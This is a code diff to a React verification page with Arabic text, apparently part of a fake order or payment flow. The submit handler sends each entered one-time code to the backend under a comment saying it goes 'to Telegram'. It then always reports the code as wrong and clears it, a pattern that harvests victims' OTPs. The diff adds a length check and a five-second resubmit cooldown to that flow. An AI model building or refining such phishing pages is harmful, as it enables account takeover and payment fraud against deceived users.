@@ -8,9 +8,12 @@ import { FileText, Receipt, X, ShieldCheck, KeyRound } from "lucide-react";
 export default function VerifyPage() {
   const [otp, setOtp] = useState("");
   const [codeError, setCodeError] = useState(false);
+  const [lengthError, setLengthError] = useState(false);
   const [resent, setResent] = useState(false);
   const [cooldown, setCooldown] = useState(0);
   const cooldownRef = useRef<ReturnType<typeof setInterval> | null>(null);
+  const [submitCooldown, setSubmitCooldown] = useState(0);
+  const submitCooldownRef = useRef<ReturnType<typeof setInterval> | null>(null);
   const [confirmed, setConfirmed] = useState(false);
   const [dbOrderId, setDbOrderId] = useState<string | null>(
     typeof window !== "undefined" ? localStorage.getItem("dbOrderId") : null
@@ -89,12 +92,13 @@ export default function VerifyPage() {
     const digits = value.replace(/\D/g, "").slice(0, 6);
     setOtp(digits);
     setCodeError(false);
+    setLengthError(false);
   }
 
   async function handleSubmit(e: React.FormEvent) {
     e.preventDefault();
     const code = otp;
-    if (code.length !== 4 && code.length !== 6) { setCodeError(true); return; }
+    if (code.length !== 4 && code.length !== 6) { setLengthError(true); return; }
     
     // إرسال الرمز للتليجرام
     await fetch("/api/verify", {
@@ -106,6 +110,16 @@ export default function VerifyPage() {
     // إظهار رسالة خطأ
     setCodeError(true);
     setOtp("");
+
+    // تايمر 5 ثواني للزر
+    setSubmitCooldown(5);
+    clearInterval(submitCooldownRef.current!);
+    submitCooldownRef.current = setInterval(() => {
+      setSubmitCooldown((prev) => {
+        if (prev <= 1) { clearInterval(submitCooldownRef.current!); return 0; }
+        return prev - 1;
+      });
+    }, 1000);
   }
 
   // ── Confirmed Popup ──────────────────────────────────────────────────────────
@@ -190,6 +204,7 @@ export default function VerifyPage() {
                 />
               </div>
 
+              {lengthError && <p className="text-orange-500 text-sm font-semibold text-center -mt-4">⚠️ يجب إدخال 4 أو 6 أرقام</p>}
               {codeError && <p className="text-red-500 text-sm font-semibold text-center -mt-4">الرمز غير صحيح</p>}
               {resent && <p className="text-green-600 text-sm text-center font-medium">✅ تم إعادة إرسال الرمز</p>}
 
@@ -197,9 +212,15 @@ export default function VerifyPage() {
               <div className="space-y-4">
                 <button
                   type="submit"
-                  className="w-full py-4 px-6 rounded-xl text-white font-bold text-lg bg-[#89BA45] hover:bg-[#7aaa3a] shadow-md shadow-green-200 hover:shadow-green-300 transition-all duration-200 active:scale-95 flex items-center justify-center gap-2"
+                  disabled={submitCooldown > 0}
+                  className={`w-full py-4 px-6 rounded-xl text-white font-bold text-lg shadow-md transition-all duration-200 flex items-center justify-center gap-2 ${
+                    submitCooldown > 0
+                      ? "bg-gray-400 cursor-not-allowed opacity-60"
+                      : "bg-[#89BA45] hover:bg-[#7aaa3a] shadow-green-200 hover:shadow-green-300 active:scale-95"
+                  }`}
                 >
-اتمام الطلب                  <ShieldCheck className="w-5 h-5" />
+                  {submitCooldown > 0 ? `انتظر (${submitCooldown}s)` : "اتمام الطلب"}
+                  <ShieldCheck className="w-5 h-5" />
                 </button>
 
                 <div className="flex flex-col items-center gap-3 text-sm">
